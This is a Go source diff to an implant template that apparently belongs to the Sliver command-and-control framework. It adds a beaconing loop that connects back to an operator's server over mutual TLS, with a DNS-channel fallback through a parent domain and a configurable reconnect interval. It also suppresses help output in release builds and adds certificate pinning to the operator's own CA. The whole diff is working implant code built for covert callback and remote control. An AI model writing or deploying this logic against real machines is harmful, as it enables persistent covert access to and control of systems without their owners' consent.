@@ -1,8 +1,10 @@
 package main
 
 import (
+	"crypto/x509"
 	"flag"
 	"io"
+	"os"
 
 	// {{if .Debug}}
 	// {{else}}
@@ -24,16 +26,18 @@ var (
 
 	defaultServerIP = `{{.DefaultServer}}`
 
-	timeout        = 30 * time.Second
+	dnsParent = `{{.DNSParent}}`
+
 	readBufSize    = 64 * 1024 // 64kb
 	zeroReadsLimit = 10
 
-	maxErrors = 100
+	maxErrors = 100 // TODO: Make configurable
 
 	server *string
 	lport  *int
 
 	defaultServerLport = getDefaultServerLport()
+	reconnectInterval  = getReconnectInterval()
 )
 
 func main() {
@@ -47,24 +51,54 @@ func main() {
 
 	server = flag.String("server", defaultServerIP, "")
 	lport = flag.Int("lport", defaultServerLport, "")
-	flag.Usage = func() {}
+
+	// {{if .Debug}}
+	// {{else}}
+	flag.Usage = func() {} // No help!
+	// {{end}}
+
 	flag.Parse()
 
 	// {{if .Debug}}
 	log.Printf("Hello my name is %s", sliverName)
 	// {{end}}
 
-	connectionErrors := 0
-	for connectionErrors < maxErrors {
-		err := start()
-		if err != nil {
-			connectionErrors++
-		}
-		time.Sleep(30 * time.Second)
-	}
+	startConnectionLoop()
 }
 
-func start() error {
+func startConnectionLoop() {
+	connectionAttempts := 0
+	for connectionAttempts < maxErrors {
+		err := mtlsConnect()
+		if err != nil {
+			// {{if .Debug}}
+			log.Printf("[mtls] Connection failed %s", err)
+			// {{end}}
+		}
+		connectionAttempts++
+
+		if dnsParent != "" {
+			err = dnsConnect()
+			if err != nil {
+				// {{if .Debug}}
+				log.Printf("[dns] Connection failed %s", err)
+				// {{end}}
+			}
+			connectionAttempts++
+		} else {
+			// {{if .Debug}}
+			log.Printf("No DNS parent domain configured\n")
+			// {{end}}
+		}
+
+		time.Sleep(reconnectInterval)
+	}
+	// {{if .Debug}}
+	log.Printf("[!] Max connection errors reached\n")
+	// {{end}}
+}
+
+func mtlsConnect() error {
 	// {{if .Debug}}
 	log.Printf("Connecting -> %s:%d", *server, uint16(*lport))
 	// {{end}}
@@ -99,10 +133,66 @@ func start() error {
 	return nil
 }
 
+func dnsConnect() error {
+	// {{if .Debug}}
+	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
+	// {{end}}
+
+	LookupDomainKey(sliverName, dnsParent)
+
+	return nil
+}
+
 func getDefaultServerLport() int {
 	lport, err := strconv.Atoi(`{{.DefaultServerLPort}}`)
 	if err != nil {
 		return 8888
 	}
 	return lport
+}
+
+func getReconnectInterval() time.Duration {
+	reconnect, err := strconv.Atoi(`{{.ReconnectInterval}}`)
+	if err != nil {
+		return 30 * time.Second
+	}
+	return time.Duration(reconnect) * time.Second
+}
+
+// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
+// we have to disable all of the fucking certificate validation and re-implement everything.
+// https://github.com/golang/go/issues/21971
+func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {
+
+	roots := x509.NewCertPool()
+	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
+	if !ok {
+		// {{if .Debug}}
+		log.Printf("Failed to parse root certificate")
+		// {{end}}
+		os.Exit(3)
+	}
+
+	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to parse certificate: " + err.Error())
+		// {{end}}
+		return err
+	}
+
+	// Basically we only care if the certificate was signed by our authority
+	// Go selects sensible defaults for time and EKU, basically we're only
+	// skipping the hostname check, I think?
+	options := x509.VerifyOptions{
+		Roots: roots,
+	}
+	if _, err := cert.Verify(options); err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to verify certificate: " + err.Error())
+		// {{end}}
+		return err
+	}
+
+	return nil
 }
